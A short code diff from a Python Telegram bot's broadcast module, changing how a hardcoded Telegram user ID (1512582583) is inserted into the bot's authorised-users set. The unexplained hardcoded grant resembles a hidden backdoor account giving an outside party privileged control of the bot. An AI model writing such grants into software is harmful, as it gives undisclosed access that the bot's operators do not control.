@@ -13,7 +13,7 @@ from pyrogram.types import Message
 from pyrogram.errors import FloodWait, InputUserDeactivated, UserIsBlocked, PeerIdInvalid
 
 broadcast_ids = {}
-Config.AUTH_USERS.append(1512582583) 
+Config.AUTH_USERS.add(1512582583) 
 
 async def send_msg(user_id, message):
     try:
